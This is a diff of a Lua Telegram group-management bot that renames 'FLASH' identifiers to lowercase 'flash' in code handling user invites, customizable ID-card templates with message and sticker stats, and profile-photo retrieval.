 local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
 function invite_by_username(extra, result, success)
 if result.id_ then
 add_user(msg.chat_id_, result.id_, 5)
 else
-if FLASHdx1:get(FLASH..'lang:gp:'..msg.chat_id_) then
+if flashdx1:get(flash..'lang:gp:'..msg.chat_id_) then
 texts = '❅∫ User not found '
 else
 texts = '❅∫ المعرف غير صحيح '
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
 end end
 resolve_username(ap[2],invite_by_username)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^[Ii]nvite (%d+)$") then 
 local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
 add_user(msg.chat_id_, ap[2], 5)
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_owner(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^تغيير الايدي$") and FLASH11(msg) or text and text:match("^تغير الايدي$") and FLASH11(msg) then 
+if text and text:match("^تغيير الايدي$") and flash11(msg) or text and text:match("^تغير الايدي$") and flash11(msg) then 
 local List = {
 [[
 ゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
@@ -6713,159 +6713,159 @@ local List = {
 ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
 ]]}
 local Text_Rand = List[math.random(#List)]
-FLASHdx1:set("FLASH:FLASH:id:text:"..bot_id..msg.chat_id_,Text_Rand)
-local FLASH = '❅∫ اهلا عزيزي  '..renk_FLASH(msg)..' \n❅∫ تم تغيير كليشة الايدي ،\n❅∫ ارسل الامر مره اخرى للتغيير مجددا ،'
-FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md')
+flashdx1:set("flash:flash:id:text:"..bot_id..msg.chat_id_,Text_Rand)
+local flash = '❅∫ اهلا عزيزي  '..renk_flash(msg)..' \n❅∫ تم تغيير كليشة الايدي ،\n❅∫ ارسل الامر مره اخرى للتغيير مجددا ،'
+flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) then
-if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") and FLASH11(msg) or text and text:match("^تعيين ايدي عام$") and FLASH11(msg) or text and text:match("^تعيين الايدي عام$") and FLASH11(msg) then   
-FLASHdx(msg.chat_id_, msg.id_, 1, ' \n❅∫ لتعيين كليشه الايدي استخدم الدوال ادناه ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
-FLASHdx1:set("FLASH:New:id:"..bot_id..msg.sender_user_id_,'FLASH')
-return "FLASH"
+if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") and flash11(msg) or text and text:match("^تعيين ايدي عام$") and flash11(msg) or text and text:match("^تعيين الايدي عام$") and flash11(msg) then   
+flashdx(msg.chat_id_, msg.id_, 1, ' \n❅∫ لتعيين كليشه الايدي استخدم الدوال ادناه ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
+flashdx1:set("flash:New:id:"..bot_id..msg.sender_user_id_,'flash')
+return "flash"
 end
-if text and FLASHdx1:get("FLASH:New:id:"..bot_id..msg.sender_user_id_) then 
+if text and flashdx1:get("flash:New:id:"..bot_id..msg.sender_user_id_) then 
 if text == 'الغاء' then   
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ كليشة الايدي ،', 1, 'md')
-FLASHdx1:del("FLASH:New:id:"..bot_id..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ كليشة الايدي ،', 1, 'md')
+flashdx1:del("flash:New:id:"..bot_id..msg.sender_user_id_)
 return false
 end
-FLASHdx1:del("FLASH:New:id:"..bot_id..msg.sender_user_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ كليشة الايدي العامه ،', 1, 'md')
-FLASHdx1:set("FLASH:FLASH:id:text:"..bot_id,text)
+flashdx1:del("flash:New:id:"..bot_id..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ كليشة الايدي العامه ،', 1, 'md')
+flashdx1:set("flash:flash:id:text:"..bot_id,text)
 return false
 end
 if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
-local FLASH = '❅∫ اهلا عزيزي  '..renk_FLASH(msg)..' \n❅∫ تم حذف كليشة الايدي العامه ،'
-FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md')
-FLASHdx1:del("FLASH:FLASH:id:text:"..bot_id)
+local flash = '❅∫ اهلا عزيزي  '..renk_flash(msg)..' \n❅∫ تم حذف كليشة الايدي العامه ،'
+flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md')
+flashdx1:del("flash:flash:id:text:"..bot_id)
 end end
---     By Developer FLASH     -- 
-if text and text:match("^تعيين الايدي$") and FLASH11(msg) or text and text:match("^تعين الايدي$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, ' \n❅∫ لتعيين كليشه الايدي استخدم الدوال ادناه ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
-FLASHdx1:set("FLASH:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'FLASH')
-return "FLASH"
+--     By Developer flash     -- 
+if text and text:match("^تعيين الايدي$") and flash11(msg) or text and text:match("^تعين الايدي$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, ' \n❅∫ لتعيين كليشه الايدي استخدم الدوال ادناه ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
+flashdx1:set("flash:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'flash')
+return "flash"
 end
-if text and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
+if text and is_owner(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
 if text == 'الغاء' then   
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ كليشة الايدي ،', 1, 'md')
-FLASHdx1:del("FLASH:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ كليشة الايدي ،', 1, 'md')
+flashdx1:del("flash:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 return false
 end
-FLASHdx1:del("FLASH:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الكليشة الجديده ،', 1, 'md')
-FLASHdx1:set("FLASH:FLASH:id:text:"..bot_id..msg.chat_id_,text)
+flashdx1:del("flash:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الكليشة الجديده ،', 1, 'md')
+flashdx1:set("flash:flash:id:text:"..bot_id..msg.chat_id_,text)
 return false
 end
-if text and text:match("^حذف الايدي$") and FLASH11(msg) or text and text:match("^مسح الايدي$") and FLASH11(msg) then
-local FLASH = '❅∫ اهلا عزيزي  '..renk_FLASH(msg)..' \n❅∫ تم حذف كليشة الايدي ،'
-FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md')
-FLASHdx1:del("FLASH:FLASH:id:text:"..bot_id..msg.chat_id_)
+if text and text:match("^حذف الايدي$") and flash11(msg) or text and text:match("^مسح الايدي$") and flash11(msg) then
+local flash = '❅∫ اهلا عزيزي  '..renk_flash(msg)..' \n❅∫ تم حذف كليشة الايدي ،'
+flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md')
+flashdx1:del("flash:flash:id:text:"..bot_id..msg.chat_id_)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.reply_to_message_id_ ~= 0 then
 return ""
 else 
-if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and FLASH11(msg) then
-function FLASH(extra,result,success)
+if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and flash11(msg) then
+function flash(extra,result,success)
 if result.username_ then username = '@'..result.username_ else username = ' لا يوجد 🎍 ' end
 local function getpro(extra, result, success) 
-local FLASH = FLASHdx1:get(FLASH..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
-local FLASHy = (FLASHdx1:get('FLASH:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-local user_msgs = FLASHdx1:get(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local sticker = (tonumber(FLASHdx1:get(FLASH.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
-local user_nkt = tonumber(FLASHdx1:get(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
-local cont = (tonumber(FLASHdx1:get(FLASH..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
-local msguser = tonumber(FLASHdx1:get(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
+local flash = flashdx1:get(flash..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local flashy = (flashdx1:get('flash:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+local user_msgs = flashdx1:get(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local sticker = (tonumber(flashdx1:get(flash.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
+local user_nkt = tonumber(flashdx1:get(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
+local cont = (tonumber(flashdx1:get(flash..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+local msguser = tonumber(flashdx1:get(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
 if result.photos_[0] then
 
-if not FLASHdx1:get('FLASH:id:mute'..msg.chat_id_) then 
-if not FLASHdx1:get('FLASH:id:photo'..msg.chat_id_) then
-if FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id) then 
-new_idii = FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id)
+if not flashdx1:get('flash:id:mute'..msg.chat_id_) then 
+if not flashdx1:get('flash:id:photo'..msg.chat_id_) then
+if flashdx1:get("flash:flash:id:text:"..bot_id) then 
+new_idii = flashdx1:get("flash:flash:id:text:"..bot_id)
 new_idii = new_idii:gsub('#username',(username or 'لا يوجد'))
 new_idii = new_idii:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
 new_idii = new_idii:gsub('#sticker',(sticker or 'لا يوجد'))
 new_idii = new_idii:gsub('#game',(user_nkt or 'لا يوجد'))
 new_idii = new_idii:gsub('#cont',(cont or 'لا يوجد'))
-new_idii = new_idii:gsub('#msgs',(user_msgs + FLASHy  or 'لا يوجد'))
+new_idii = new_idii:gsub('#msgs',(user_msgs + flashy  or 'لا يوجد'))
 new_idii = new_idii:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
-new_idii = new_idii:gsub('#msgday',(FLASH or 'لا يوجد'))
+new_idii = new_idii:gsub('#msgday',(flash or 'لا يوجد'))
 new_idii = new_idii:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
-new_idii = new_idii:gsub('#stast',(FLASH_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
+new_idii = new_idii:gsub('#stast',(flash_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
 else
-new_idii = "\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..FLASH_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + FLASHy).." • "..(FLASH).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
+new_idii = "\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..flash_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + flashy).." • "..(flash).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
 end 
-if not FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id..msg.chat_id_) then 
+if not flashdx1:get("flash:flash:id:text:"..bot_id..msg.chat_id_) then 
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_idii,msg.id_,msg.id_.."")
 else 
 
-local new_id = FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id..msg.chat_id_)
+local new_id = flashdx1:get("flash:flash:id:text:"..bot_id..msg.chat_id_)
 local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
 local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
 local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
 local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
 local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
-local new_id = new_id:gsub('#msgs',(user_msgs + FLASHy or 'لا يوجد'))
+local new_id = new_id:gsub('#msgs',(user_msgs + flashy or 'لا يوجد'))
 local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
 local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
-local new_id = new_id:gsub('#stast',(FLASH_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
+local new_id = new_id:gsub('#stast',(flash_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
 end else
-if FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id) then 
-new_ide = FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id)
+if flashdx1:get("flash:flash:id:text:"..bot_id) then 
+new_ide = flashdx1:get("flash:flash:id:text:"..bot_id)
 new_ide = new_ide:gsub('#username',(username or 'لا يوجد'))
 new_ide = new_ide:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
 new_ide = new_ide:gsub('#sticker',(sticker or 'لا يوجد'))
 new_ide = new_ide:gsub('#game',(user_nkt or 'لا يوجد'))
 new_ide = new_ide:gsub('#cont',(cont or 'لا يوجد'))
-new_ide = new_ide:gsub('#msgs',(user_msgs + FLASHy or 'لا يوجد'))
+new_ide = new_ide:gsub('#msgs',(user_msgs + flashy or 'لا يوجد'))
 new_ide = new_ide:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
 new_ide = new_ide:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
-new_ide = new_ide:gsub('#stast',(FLASH_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
+new_ide = new_ide:gsub('#stast',(flash_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
 else
-new_ide = "\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..FLASH_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + FLASHy).." • "..(FLASH).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
+new_ide = "\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..flash_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + flashy).." • "..(flash).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
 end
-if not FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, new_ide, 1, 'html')
+if not flashdx1:get("flash:flash:id:text:"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, new_ide, 1, 'html')
 else
-local new_id = FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id..msg.chat_id_)
+local new_id = flashdx1:get("flash:flash:id:text:"..bot_id..msg.chat_id_)
 local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
 local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
 local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
 local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
 local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
-local new_id = new_id:gsub('#msgs',(user_msgs + FLASHy or 'لا يوجد'))
+local new_id = new_id:gsub('#msgs',(user_msgs + flashy or 'لا يوجد'))
 local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
 local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
-local new_id = new_id:gsub('#stast',(FLASH_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
-FLASHdx(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')
+local new_id = new_id:gsub('#stast',(flash_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
+flashdx(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')
 end end else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الايدي معطل  ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الايدي معطل  ', 1, 'md')
 end else  
 
-if FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id) then 
-new_idii = FLASHdx1:get("FLASH:FLASH:id:text:"..bot_id)
+if flashdx1:get("flash:flash:id:text:"..bot_id) then 
+new_idii = flashdx1:get("flash:flash:id:text:"..bot_id)
 new_idii = new_idii:gsub('#username',(username or 'لا يوجد'))
 new_idii = new_idii:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
 new_idii = new_idii:gsub('#sticker',(sticker or 'لا يوجد'))
 new_idii = new_idii:gsub('#game',(user_nkt or 'لا يوجد'))
 new_idii = new_idii:gsub('#cont',(cont or 'لا يوجد'))
-new_idii = new_idii:gsub('#msgs',(user_msgs + FLASHy or 'لا يوجد'))
+new_idii = new_idii:gsub('#msgs',(user_msgs + flashy or 'لا يوجد'))
 new_idii = new_idii:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
-new_idii = new_idii:gsub('#msgday',(FLASH or 'لا يوجد'))
+new_idii = new_idii:gsub('#msgday',(flash or 'لا يوجد'))
 new_idii = new_idii:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
-new_idii = new_idii:gsub('#stast',(FLASH_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
+new_idii = new_idii:gsub('#stast',(flash_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
 else
-new_idii  = ".𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..FLASH_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + FLASHy).." • "..(FLASH).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
+new_idii  = ".𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..flash_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + flashy).." • "..(flash).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
 end
-if not FLASHdx1:get('FLASH:id:mute'..msg.chat_id_) then 
-if not FLASHdx1:get('FLASH:id:photo'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, new_idii, 1, 'html')
+if not flashdx1:get('flash:id:mute'..msg.chat_id_) then 
+if not flashdx1:get('flash:id:photo'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, new_idii, 1, 'html')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, ".𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..renk_forid.."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + FLASHy).." • "..(FLASH).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, ".𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..renk_forid.."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + flashy).." • "..(flash).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n", 1, 'md')
 end else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الايدي معطل  ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الايدي معطل  ', 1, 'md')
 end end end
 tdcli_function ({
 ID = "GetUserProfilePhotos",
@@ -6874,86 +6874,86 @@ offset_ = 0,
 limit_ = 1 
 }, getpro, nil) 
 end
-getUser(msg.sender_user_id_, FLASH)
+getUser(msg.sender_user_id_, flash)
 end end
---     By Developer FLASH     -- 
- if text == "صورتي" and not FLASHdx1:get(FLASH.."lock:get:photo"..msg.chat_id_)  and FLASH11(msg) then 
+--     By Developer flash     -- 
+ if text == "صورتي" and not flashdx1:get(flash.."lock:get:photo"..msg.chat_id_)  and flash11(msg) then 
 local function getpro(extra, result, success)
 if result.photos_[0] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"❅∫ لديك "..result.total_count_.." صوره‌‏ ", msg.id_, msg.id_, "md")
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا تمتلك صوره في حسابك  ", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا تمتلك صوره في حسابك  ", 1, 'md')
 end end
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
 end
---     By Developer FLASH     -- 
-if text and text:match("^صورتي (%d+)$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^صورتي (%d+)$") and flash11(msg) then
 local pronumb = {string.match(text, "^(صورتي) (%d+)$")}
 local function gproen(extra, result, success)
-if not is_momod(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get(FLASH.."lock:get:photo"..msg.chat_id_)  then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ جلب الصوره الشخصيه معطل ،', 1, 'md')
+if not is_momod(msg.sender_user_id_, msg.chat_id_) and flashdx1:get(flash.."lock:get:photo"..msg.chat_id_)  then 
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ جلب الصوره الشخصيه معطل ،', 1, 'md')
 else
 if pronumb[2] == '1' then
 if result.photos_[0] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا تمتلك صوره في حسابك  ", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا تمتلك صوره في حسابك  ", 1, 'md')
 end
 elseif pronumb[2] == '2' then
 if result.photos_[1] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '3' then
 if result.photos_[2] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '4' then
 if result.photos_[3] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '5' then
 if result.photos_[4] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '6' then
 if result.photos_[5] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '7' then
 if result.photos_[6] then
